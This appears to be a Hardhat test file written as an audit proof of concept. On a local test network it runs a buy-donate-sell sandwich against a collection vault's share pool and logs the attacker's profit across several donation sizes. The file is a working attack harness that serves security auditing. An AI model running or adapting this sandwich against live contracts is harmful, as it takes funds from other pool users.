import { ethers } from "hardhat";
import { takeSnapshot, type SnapshotRestorer } from "@nomicfoundation/hardhat-network-helpers";

/**
 * AUDIT PoC — ATTACK A: buyShares -> (donation lands) -> sellShares sandwich.
 * Measures ACTUAL attacker P&L across donation/reserve ratios to find the real
 * break-even against the ~3% swap round-trip toll.
 */
describe("AUDIT PoC: donation sandwich via buyShares/sellShares", () => {
  let snap: SnapshotRestorer;
  before(async () => { snap = await takeSnapshot(); });
  after(async () => { await snap.restore(); });

  async function fresh(seedPay: bigint, seedSh: bigint) {
    const [deployer, sink, treasury, alice, attacker] = await ethers.getSigners();
    const payment: any = await (await ethers.getContractFactory("MockIndexToken")).deploy("PAY", "PAY");
    const nft: any = await (await ethers.getContractFactory("MockRobinWoodNft")).deploy();
    const factory: any = await (
      await ethers.getContractFactory("CollectionVaultFactory")
    ).deploy(sink.address, await payment.getAddress(), 48 * 3600);
    const vaultAddr = await factory.deployVault.staticCall(await nft.getAddress(), treasury.address, 810);
    await factory.deployVault(await nft.getAddress(), treasury.address, 810);
    const vault: any = await ethers.getContractAt("CollectionVault", vaultAddr);
    for (const who of [alice, attacker, treasury, deployer]) {
      await payment.mint(who.address, ethers.parseEther("10000000"));
      await payment.connect(who).approve(vaultAddr, ethers.MaxUint256);
      await vault.connect(who).approve(vaultAddr, ethers.MaxUint256);
    }
    const n = Number(seedSh / 10n ** 18n) + 5;
    for (let i = 1; i <= n; i++) {
      await nft.mint(alice.address, i);
      await nft.connect(alice).approve(vaultAddr, i);
      await vault.connect(alice).deposit(i);
    }
    await vault.connect(treasury).seedLiquidity(seedPay);
    await vault.connect(alice).transfer(treasury.address, seedSh);
    await vault.connect(treasury).seedShares(seedSh);
    await vault.connect(treasury).openPool();
    return { vault, payment, attacker, deployer };
  }

  it("measures attacker P&L vs donation/reserve ratio", async () => {
    const seedPay = ethers.parseEther("100");
    const seedSh = ethers.parseEther("10");
    // trade size = 10% of reserve; donation swept across ratios
    const tradeIn = ethers.parseEther("10");
    for (const donEth of ["0.0025", "0.25", "1", "3", "5", "10"]) {
      const { vault, payment, attacker, deployer } = await fresh(seedPay, seedSh);
      const D = ethers.parseEther(donEth);
      const before = await payment.balanceOf(attacker.address);
      const out = await vault.connect(attacker).buyShares.staticCall(tradeIn, 0);
      await vault.connect(attacker).buyShares(tradeIn, 0);
      await vault.connect(deployer).donateReserves(D);
      await vault.connect(attacker).sellShares(out, 0);
      const pnl = (await payment.balanceOf(attacker.address)) - before;
      const ratio = (Number(donEth) / 100) * 100;
      console.log(
        `  donation ${donEth} PAY (D/PR=${ratio.toFixed(4)}%)  ->  attacker P&L = ${ethers.formatEther(pnl)} PAY  ${pnl > 0n ? "*** PROFIT ***" : "loss"}`
      );
    }
  });
});
